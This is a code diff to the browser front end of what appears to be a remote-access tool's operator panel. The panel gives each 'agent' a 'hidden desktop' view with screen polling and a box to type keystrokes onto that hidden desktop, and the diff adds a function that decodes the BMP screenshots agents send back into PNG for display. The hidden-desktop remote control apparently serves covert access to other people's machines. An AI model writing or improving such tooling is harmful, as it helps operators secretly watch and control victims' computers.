@@ -432,7 +432,7 @@
                         '<button type="button" class="glass-btn" data-hd="frame">Frame</button>' +
                         '<button type="button" class="glass-btn" data-hd="stop">Stop</button>' +
                     '</div>' +
-                    '<img class="hd-img" id="hd-img-' + escapeHtml(agentId) + '" alt="hidden desktop" tabindex="0">' +
+                    '<img class="hd-img" id="hd-img-' + escapeHtml(agentId) + '" alt="" tabindex="0" style="display:none">' +
                     '<input type="text" class="hd-type" id="hd-type-' + escapeHtml(agentId) + '" placeholder="Type on the hidden desktop, Enter to send">' +
                 '</div>';
             document.getElementById('tab-content').appendChild(pane);
@@ -691,6 +691,37 @@
         setTimeout(function() { pollDesktop(agentId); }, 1500);
     }
 
+    function bmpToPng(b64) {
+        var bin = atob(b64.replace(/\s/g, ''));
+        var bytes = new Uint8Array(bin.length);
+        for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+        var view = new DataView(bytes.buffer);
+        var off = view.getUint32(10, true);
+        var w = view.getInt32(18, true);
+        var h = view.getInt32(22, true);
+        var top = h < 0;
+        if (top) h = -h;
+        var canvas = document.createElement('canvas');
+        canvas.width = w;
+        canvas.height = h;
+        var ctx = canvas.getContext('2d');
+        var image = ctx.createImageData(w, h);
+        var stride = Math.floor((w * 3 + 3) / 4) * 4;
+        for (var y = 0; y < h; y++) {
+            var sy = top ? y : (h - 1 - y);
+            for (var x = 0; x < w; x++) {
+                var s = off + sy * stride + x * 3;
+                var d = (y * w + x) * 4;
+                image.data[d] = bytes[s + 2];
+                image.data[d + 1] = bytes[s + 1];
+                image.data[d + 2] = bytes[s];
+                image.data[d + 3] = 255;
+            }
+        }
+        ctx.putImageData(image, 0, 0);
+        return canvas.toDataURL('image/png');
+    }
+
     function showDesktopFrame(agentId, out) {
         if (!out || out.indexOf('HDIMG:') !== 0) return;
         var payload = out.slice(6);
@@ -703,9 +734,17 @@
             payload = payload.slice(colon + 1);
         }
         var img = document.getElementById('hd-img-' + agentId);
-        if (img) img.src = 'data:image/bmp;base64,' + payload;
         var status = document.getElementById('hd-status-' + agentId);
-        if (status) status.textContent = desktopScreen[agentId].w + 'x' + desktopScreen[agentId].h;
+        if (img) {
+            try {
+                img.src = bmpToPng(payload);
+                img.style.display = 'block';
+                if (status) status.textContent = desktopScreen[agentId].w + 'x' + desktopScreen[agentId].h;
+            } catch (err) {
+                img.style.display = 'none';
+                if (status) status.textContent = 'frame decode failed';
+            }
+        }
     }
 
     async function pollDesktop(agentId) {
